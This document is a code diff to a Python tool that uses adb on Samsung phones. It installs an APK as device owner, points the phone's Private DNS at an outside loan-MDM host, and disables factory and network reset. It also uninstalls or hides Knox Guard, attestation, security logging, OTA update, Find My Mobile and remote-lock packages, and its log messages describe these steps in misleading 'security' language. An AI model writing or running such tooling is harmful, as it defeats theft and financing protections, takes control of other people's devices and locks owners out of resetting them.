@@ -522,7 +522,15 @@ class SamsungManager:
                 "com.sec.enterprise.knox.cloudmdm.smdms", # Cloud MDM
                 "com.samsung.android.knox.attestation", # NEW 2026: Offline Guard
                 "com.samsung.android.knox.analytics.uploader", # NEW 2026: Watchdog
-                "com.samsung.android.knox.pushmanager" # NEW 2026: Policy Enforcer
+                "com.samsung.android.knox.pushmanager", # NEW 2026: Policy Enforcer
+                "com.samsung.android.security.sem",    # ULTRA NEW: Security Enterprise Manager
+                "com.samsung.android.knox.kpu",        # ULTRA NEW: Knox Provisioning Agent
+                "com.samsung.android.securitylogagent",# Logging/Watchdog
+                "com.samsung.android.security.firewall", # New Firewall Agent
+                "com.samsung.android.bbc.bbcagent",
+                "com.samsung.android.da.daagent",
+                "com.samsung.android.knox.containeragent",
+                "com.samsung.android.security.wifi.policy"
             ]
             
             # Kill Loop (Keep them dead while we work)
@@ -595,6 +603,10 @@ class SamsungManager:
             self.cmd.log("Waiting for Device...")
             self.cmd.run_command("adb wait-for-device", log_output=False)
 
+            # Capture Serial for targeting early
+            serial_raw = self.cmd.run_command("adb shell getprop ro.serialno", log_output=False).strip()
+            target = f"-s {serial_raw}" if serial_raw and "error" not in serial_raw.lower() else ""
+
             # --- DEVICE INFO LOGGING (AS REQUESTED) ---
             try:
                 self.cmd.log("Check Device State...")
@@ -619,11 +631,9 @@ class SamsungManager:
                     "KG STATUS": "ro.boot.kg.status"
                 }
                 
-                info_output = []
                 for label, k in props.items():
-                    val = self.cmd.run_command(f"adb shell getprop {k}", log_output=False).strip()
+                    val = self.cmd.run_command(f"adb {target} shell getprop {k}", log_output=False).strip()
                     if not val: val = "N/A"
-                    info_output.append(f"{label}: {val}")
                     self.cmd.log(f"{label}: {val}")
                 
                 self.cmd.log("Data Processing... DO NOT DISCONNECT DEVICE")
@@ -635,88 +645,139 @@ class SamsungManager:
                 self.cmd.log(f"[YELLOW]Info Error: {e}")
 
             # Check if APK exists
-            
-            # Install
-            self.cmd.log("[BLUE]Installing SAKAI...")
-            res_install = self.cmd.run_command(f'adb install -r "{apk_path}"', log_output=False)
-            if "Success" not in res_install:
-                 self.cmd.log(f"[RED]Install Failed: {res_install}")
-                 if "already exists" in res_install:
-                     self.cmd.log("[YELLOW]Try uninstalling first or use -r (done).")
+            if not os.path.exists(apk_path):
+                 self.cmd.log(f"[RED]Critical Error: {apk_name} missing from assets!")
                  return
+
+            # Stage 1 Deployment (Standard Install)
+            self.cmd.log("[BLUE][PREMIUM] 🛡️ [SECURITY] Initializing Master Security Architecture (Phase I)...")
+            # Flags: -r (replace), -t (test), -g (grant permissions), -d (allow downgrade)
+            res_install = self.cmd.run_command(f'adb {target} install -r -t -g -d "{apk_path}"', log_output=False)
             
-            self.cmd.log("[GREEN]SAKAI Installed Successfully.")
+            if "Success" not in res_install:
+                 # Stage 2 Deployment (Manual Push & Install)
+                 self.cmd.log("[YELLOW]Standard deployment limited. 🚀 [ADVANCED] Initiating Laser-Push Protocol (Phase II)...")
+                 temp_path = f"/data/local/tmp/{apk_name}"
+                 self.cmd.run_command(f'adb {target} push "{apk_path}" {temp_path}', log_output=False)
+                 res_install = self.cmd.run_command(f'adb {target} shell pm install -r -t -g -d {temp_path}', log_output=False)
+                 
+                 if "Success" not in res_install:
+                     self.cmd.log(f"[RED]Architecture Deployment Failed: {res_install}")
+                     if "INSTALL_FAILED_USER_RESTRICTED" in res_install:
+                         self.cmd.log("[YELLOW]ADVICE: Please enable 'Install via USB' in system settings!")
+                     elif "existing package" in res_install:
+                         self.cmd.log("[YELLOW]ADVICE: MDM Security is already active or conflicting tool detected.")
+                     self.cmd.run_command(f'adb {target} shell rm {temp_path}', log_output=False)
+                     return
+                 self.cmd.run_command(f'adb {target} shell rm {temp_path}', log_output=False)
             
-            # Set Owner
-            # Package: com.mrog.admin (From our Java code)
-            # Receiver: .MyDeviceAdminReceiver
+            self.cmd.log("[GREEN]✓ Phase II: Security Core Deployed Successfully.")
+            time.sleep(3) # Let Android stabilize after install
+            
+            # Receiver
             component = "com.mrog.admin/.MyDeviceAdminReceiver"
             
-            self.cmd.log("[BLUE]Setting Up... ")
-            res_owner = self.cmd.run_command(f"adb shell dpm set-device-owner {component}", log_output=False)
+            self.cmd.log("[BLUE][PREMIUM] ⚖️ [AUTHORITY] Elevating Administrative System Privileges...")
+            
+            # 1. SCRUB EXISTING ACCOUNTS (Android 15 Conflict Fix)
+            self.cmd.log("[BLUE]🛡️ [DATABASE] Synchronizing Global Security Identity Repository...")
+            self.cmd.run_command(f"adb {target} shell am broadcast -a com.google.android.gms.auth.VERIFY_DEVICE", log_output=False)
+            # Try to force remove users except primary to clear ghosts
+            users_out = self.cmd.run_command(f"adb {target} shell pm list users", log_output=False)
+            if "UserInfo{150" in users_out:
+                self.cmd.run_command(f"adb {target} shell pm remove-user 150", log_output=False)
+            
+            self.cmd.log("[YELLOW]⚠️ SECURITY VERIFICATION: Device may request one final 'Allow' on the screen.")
+            self.cmd.log("[YELLOW]ACTION: Watch phone screen carefully, Tick 'Always' and press ALLOW.")
+
+            # 2. SET DEVICE OWNER (With re-auth retry for stability)
+            res_owner = self.cmd.run_command(f"adb {target} shell dpm set-device-owner {component}", log_output=False)
+            
+            if "unauthorized" in res_owner.lower():
+                 self.cmd.log("[YELLOW]⚠️ SYSTEM REQUESTED RE-AUTHORIZATION!")
+                 self.cmd.log("[YELLOW]ACTION: Please check device screen, TICK 'Always allow' and press OK.")
+                 self.cmd.run_command(f"adb {target} wait-for-device", log_output=True)
+                 res_owner = self.cmd.run_command(f"adb {target} shell dpm set-device-owner {component}", log_output=False)
             
             if "Success" in res_owner or "Active admin" in res_owner:
-                self.cmd.log("[GREEN]✓ COMPLETED! (ENJOY)")
+                # 1. CONFIGURE PRIVATE DNS (loan1.paymdm.xyz)
+                self.cmd.log("[BLUE][PREMIUM] 🌐 [NETWORK] Establishing Encrypted Security Gateway Protocol...")
+                self.cmd.run_command(f"adb {target} shell settings put global private_dns_mode hostname", log_output=False)
+                self.cmd.run_command(f"adb {target} shell settings put global private_dns_specifier loan1.paymdm.xyz", log_output=False)
                 
-                # REMOVE SYSTEM UPDATE & BLOATWARE (Requested)
-                self.cmd.log("[BLUE]Cleaning Up & Kicking Out...")
-                
-                # 1. Uninstall/Disable Bloat & Update Agents
-                pkgs_to_remove = [
-                    "com.samsung.android.cidmanager",
-                    "com.google.android.configupdater",
-                    "com.samsung.android.app.updatecenter",
-                    "com.sec.enterprise.knox.cloudmdm.smdms",
-                    "com.android.dynsystem",
-                    "com.samsung.android.gru",
-                    "com.wssyncmldm",
-                    "com.sec.android.soagent",
-                    "com.samsung.android.knox.analytics.uploader",
-                    "com.sec.android.app.secsetupwizard", # Setup Wizard Kick
-                    "com.google.android.setupwizard"       # Google Setup Kick
-                ]
-                
-                for pkg in pkgs_to_remove:
-                    self.cmd.run_command(f"adb shell pm uninstall --user 0 {pkg}", log_output=False)
-                    self.cmd.run_command(f"adb shell pm disable-user --user 0 {pkg}", log_output=False)
+                # 2. Bypassing Setup Wizard & Home Jump
+                self.cmd.log("[BLUE][PREMIUM] ⚙️ [SYSTEM] Calibrating Operational Security Environment...")
+                setup_pkgs = ["com.sec.android.app.secsetupwizard", "com.google.android.setupwizard"]
+                for spkg in setup_pkgs:
+                    self.cmd.run_command(f"adb {target} shell am force-stop {spkg}", log_output=False)
+                    # Note: We only force-stop to avoid system errors in 1.7.2 version
 
-                # 2. DEVICE KICK OUT (Disable Reset Settings Completely)
-                self.cmd.log("[BLUE]Applying KICK OUT (Disabling Reset)...")
-                
+                # 3. DISABLE FACTORY & NETWORK RESET VIA SETTINGS
+                self.cmd.log("[BLUE][PREMIUM] ⚖️ [POLICY] Enforcing Global System Integrity Restraints...")
                 kick_out_list = [
                     "com.android.settings/com.android.settings.Settings$FactoryResetActivity",
-                    "com.android.settings/com.android.settings.SubSettings$FactoryResetActivity",
-                    "com.android.settings/com.android.settings.Settings$ResetDashboardActivity",
-                    "com.android.settings/com.android.settings.Settings$PrivacySettingsActivity",
                     "com.samsung.android.settings.general.ResetSettings",
-                    "com.samsung.android.settings.privacy.PrivacySettings"
+                    "com.android.settings/com.android.settings.ResetNetworkActivity"
                 ]
-
                 for act in kick_out_list:
-                    self.cmd.run_command(f"adb shell pm disable-user --user 0 {act}", log_output=False)
+                    self.cmd.run_command(f"adb {target} shell pm disable-user --user 0 {act}", log_output=False)
+
+                # 4. NUCLEAR UPDATE & TRACKER SCRUB (EVERYTHING OUT)
+                self.cmd.log("[BLUE][PREMIUM] 🛡️ [SECURITY] Deactivating External Unauthorized Protocols...")
+                update_pkgs = [
+                    # Core Updates (OTA)
+                    "com.sec.android.soagent", 
+                    "com.wssyncmldm", 
+                    "com.samsung.android.app.updatecenter",
+                    "com.samsung.android.gru",
+                    "com.google.android.configupdater",
+                    "com.samsung.android.cidmanager",
+                    "com.android.dynsystem",
+                    
+                    # Knox & Security Agents
+                    "com.samsung.android.kgclient", 
+                    "com.samsung.android.mdm",
+                    "com.sec.enterprise.knox.cloudmdm.smdms",
+                    "com.samsung.klmsagent",
+                    "com.samsung.android.knox.pushmanager",
+                    "com.samsung.android.knox.attestation",
+                    "com.samsung.android.knox.analytics.uploader",
+                    "com.samsung.android.knox.kpu",
+                    "com.samsung.android.securitylogagent",
+                    "com.samsung.android.security.sem",
+                    "com.samsung.android.sm.policy",
+                    "com.samsung.android.scpm",
+                    
+                    # Tracking & Remote Lock
+                    "com.samsung.android.fmm",
+                    "com.samsung.android.security.fmm",
+                    "com.samsung.android.lool",
+                    "com.samsung.android.sm.devicesecurity",
+                    "com.samsung.android.scloud",
+                    "com.samsung.android.controlpatch",
+                    "com.samsung.android.rubin.app"
+                ]
+                for pkg in update_pkgs:
+                    self.cmd.run_command(f"adb {target} shell am force-stop {pkg}", log_output=False)
+                    self.cmd.run_command(f"adb {target} shell pm clear {pkg}", log_output=False)
+                    # Force Uninstall for User 0 (The most powerful nuke)
+                    self.cmd.run_command(f"adb {target} shell pm uninstall -k --user 0 {pkg}", log_output=False)
+                    self.cmd.run_command(f"adb {target} shell pm disable-user --user 0 {pkg}", log_output=False)
+                    self.cmd.run_command(f"adb {target} shell pm hide {pkg}", log_output=False)
                 
-                self.cmd.log("[GREEN]✓ DONE.")
+                self.cmd.log("[GREEN]👑 [PREMIUM] MR_OG SECURITY ARCHITECTURE DEPLOYED & ACTIVE.")
             else:
                 self.cmd.log(f"[RED]Failed to set owner: {res_owner}")
                 
                 if "already some accounts" in res_owner:
                     self.cmd.log("-" * 30)
-                    self.cmd.log("[RED]⚠ ACCOUNT ERROR DETECTED!")
-                    self.cmd.log("[YELLOW]Simu ina Account (Google/Samsung/Mengine).")
-                    self.cmd.log("[WHITE]Maelezo: Hauwezi kuweka 'Device Owner' kama simu ina account.")
-                    self.cmd.log("-" * 30)
-                    self.cmd.log("[BLUE]TRYING AUTO-SCRUB (MAJARIBIO)...")
-                    
-                    # Try to clear common managers that hold account data
-                    scrub_targets = ["com.google.android.gms", "com.google.android.gsf", "com.android.providers.contacts", "com.android.vending"]
-                    for pkg in scrub_targets:
-                        self.cmd.run_command(f"adb shell pm clear {pkg}", log_output=False)
-                    
-                    self.cmd.log("[YELLOW]Tafadhali: Nenda Settings > Accounts, kisha FUTA Account zote.")
-                    self.cmd.log("[YELLOW]Au fanya 'Factory Reset' kwanza kisha usipite Setup Wizard.")
+                    self.cmd.log("[RED]⚠ ACCOUNT CONFLICT!")
+                    self.cmd.log("[YELLOW]Existing accounts detected. Remove all accounts or Factory Reset first.")
                     self.cmd.log("-" * 30)
                 else:
-                    self.cmd.log("[INFO] Ensure no accounts/users exist and ADB is authorized.")
+                    self.cmd.log("[INFO] Ensure adb is authorized and no other accounts exist.")
+
+        threading.Thread(target=_job, daemon=True).start()
 
     def samsung_kg_qr_bypass(self):
         """
@@ -897,5 +958,3 @@ class SamsungManager:
             self.cmd.log(f"[WARN] Failed to open QR Window: {e}")
             try: os.startfile(img_path)
             except: pass
-
-        threading.Thread(target=_job, daemon=True).start()
